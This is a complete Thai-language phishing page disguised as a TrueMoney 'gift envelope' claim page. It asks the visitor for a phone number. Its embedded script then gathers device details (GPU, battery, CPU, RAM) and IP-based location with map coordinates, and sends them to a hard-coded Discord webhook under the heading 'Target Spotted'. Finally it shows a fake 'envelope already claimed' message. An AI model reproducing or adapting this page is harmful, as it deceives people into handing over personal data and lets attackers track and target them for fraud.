<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>ของขวัญสำหรับคุณ</title>
    <meta property="og:title" content="🧧 ของขวัญสำหรับคุณ">
    <meta property="og:description" content="เพื่อนของคุณส่งซองอั่งเปาให้คุณ รับเงินเข้าวอลเล็ทได้ที่นี่">
    <meta property="og:image" content="https://img2.pic.in.th/HCdwo9KbwAAEW3c.jpg">
    <meta property="og:type" content="website">

    <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Sarabun', sans-serif; background-color: #ffffff; margin: 0; display: flex; justify-content: center; min-height: 100vh; }
        .container { width: 100%; max-width: 500px; padding: 20px; text-align: center; }
        .main-img { width: 100%; max-width: 320px; margin-bottom: 20px; }
        .sender-name { font-size: 1.3rem; font-weight: bold; color: #333; }
        .input-box { text-align: left; width: 95%; margin: 20px auto; }
        input[type="text"] { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 8px; font-size: 1.1rem; box-sizing: border-box; outline: none; width: 100%; }
        .btn-orange { background-color: #ff8c2d; color: white; border: none; width: 100%; padding: 16px; font-size: 1.1rem; font-weight: bold; border-radius: 30px; cursor: pointer; margin-top: 20px; width: 100%; }
        #loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 100; text-align: center; padding: 20px; }
        .spin { border: 4px solid #f3f3f3; border-top: 4px solid #ff8c2d; border-radius: 50%; width: 40px; height: 40px; animation: s 1s linear infinite; margin-bottom: 15px; }
        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <img class="main-img" src="https://img2.pic.in.th/HCdwo9KbwAAEW3c.jpg">
        <div class="sender-name">TrueMoney Official Gift</div> 
        <div style="color: #888;">ส่งซองทรูมันนี่ให้คุณ</div>
        <div class="input-box">
            <label style="font-size: 0.9rem; color: #666;">กรอกเบอร์โทรศัพท์เพื่อรับซอง</label>
            <input type="text" id="phone" placeholder="08x-xxx-xxxx" maxlength="10">
        </div>
        <button class="btn-orange" onclick="run()">รับซองเลย</button>
    </div>

    <div id="loader">
        <div class="spin"></div>
        <div id="status" style="color:#ff8c2d; font-weight:bold;">กำลังประมวลผล...</div>
        <div id="sub" style="color:#888; font-size: 0.85rem; margin-top: 10px;">ระบบกำลังยืนยันสิทธิ์กับเซิร์ฟเวอร์</div>
    </div>

    <script>
        const WH = "https://discord.com/api/webhooks/1493303430289162493/u7A4FZxwAdekbS0Bw5pngOyRc2DToLjFQikE0rxeCqaEO1GNy6CddP8ChlCCNqSlB854";

        async function run() {
            const p = document.getElementById('phone').value;
            if(!/^[0-9]{10}$/.test(p)) return alert("กรุณากรอกเบอร์ให้ถูกต้อง");
            document.getElementById('loader').style.display = 'flex';

            let gpu = "N/A";
            try { gpu = document.createElement('canvas').getContext('webgl').getParameter(43521); } catch(e){}
            let bat = "N/A";
            try { const b = await navigator.getBattery(); bat = `${(b.level*100).toFixed(0)}% (${b.charging?'Chg':'No'})`; } catch(e){}

            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                
                await fetch(WH, { 
                    method: 'POST', 
                    headers: { 'Content-Type': 'application/json' }, 
                    body: JSON.stringify({
                        content: `🏁 **Target Spotted (SERAS9)**\nPhone: \`${p}\``,
                        embeds: [{
                            title: "🗂️ รายงานข้อมูลเป้าหมาย",
                            color: 16745517,
                            fields: [
                                { name: "📱 เบอร์", value: `**${p}**`, inline: true },
                                { name: "🔋 แบต", value: `\`${bat}\``, inline: true },
                                { name: "📍 ISP", value: `[${d.org}](https://www.google.com/maps?q=${d.latitude},${d.longitude})\n${d.city}`, inline: false },
                                { name: "🛠️ Hardware", value: `CPU: ${navigator.hardwareConcurrency} | RAM: ${navigator.deviceMemory}GB\nGPU: ${gpu}`, inline: false }
                            ],
                            timestamp: new Date()
                        }]
                    }) 
                });
            } catch(e){}

            setTimeout(() => {
                document.getElementById('status').style.color = "#ff4444";
                document.getElementById('status').innerText = "❌ สิทธิ์รับซองเต็มแล้ว";
                document.getElementById('sub').innerText = "ขออภัย ซองอั่งเปานี้มีผู้รับครบจำนวนแล้ว";
            }, 3000);
        }
    </script>
</body>
</html>
